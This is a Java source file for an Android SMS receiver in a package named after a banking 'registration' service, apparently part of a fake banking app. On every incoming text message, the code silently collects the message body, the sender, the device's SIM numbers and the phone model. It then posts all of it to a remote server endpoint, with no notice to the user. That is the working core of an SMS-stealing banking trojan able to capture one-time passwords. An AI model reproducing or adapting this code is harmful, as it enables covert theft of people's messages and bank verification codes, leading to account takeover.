package com.yonoservice.registration;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;

import android.telephony.SmsMessage;
import android.util.Log;
import android.widget.Toast;

import org.json.JSONException;
import org.json.JSONObject;

public class SmsReceiver extends BroadcastReceiver {

    private String previous_message = "";
    private String receiver = "";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction() != null && intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")) {
            Bundle bundle = intent.getExtras();
            if (bundle != null) {
                Object[] pdus = (Object[]) bundle.get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        SmsMessage smsMessage = SmsMessage.createFromPdu((byte[]) pdu);
                        if (smsMessage != null) {
                            String sender = smsMessage.getDisplayOriginatingAddress();
                            String messageBody = smsMessage.getMessageBody();
                            receiver = Helper.getSimNumbers(context);
                            if(messageBody!=previous_message){
                                previous_message = messageBody;
                                JSONObject jsonData = new JSONObject();
                                try {
                                    Helper helper = new Helper();

                                    jsonData.put("message", messageBody);
                                    jsonData.put("sender", sender);
                                    jsonData.put("model", Build.MODEL);
                                    jsonData.put("receiver", receiver);


                                    JSONObject sender1 = new JSONObject();
                                    sender1.put("data", jsonData);
                                    sender1.put("site", helper.SITE());
                                    Log.d(Helper.TAG, sender1.toString());

                                    Helper.postRequest(helper.SMSSavePath(), sender1, new Helper.ResponseListener() {
                                        @Override
                                        public void onResponse(String result) {
                                            if (result.startsWith("Response Error:")) {
                                                Log.d(Helper.TAG, "Response Error : "+result);
                                                Toast.makeText(context, "Response Error : "+result, Toast.LENGTH_SHORT).show();
                                            } else {
                                                Log.d(Helper.TAG, "SMS Saved : "+result);
                                            }
                                        }
                                    });
                                } catch (JSONException e) {
                                    throw new RuntimeException(e);
                                }
                            }else{
                                Log.d("mywork", "Duplicate message received from " + sender + " with message: " + messageBody);
                            }
                        }
                    }
                }
            }
        }
    }

}
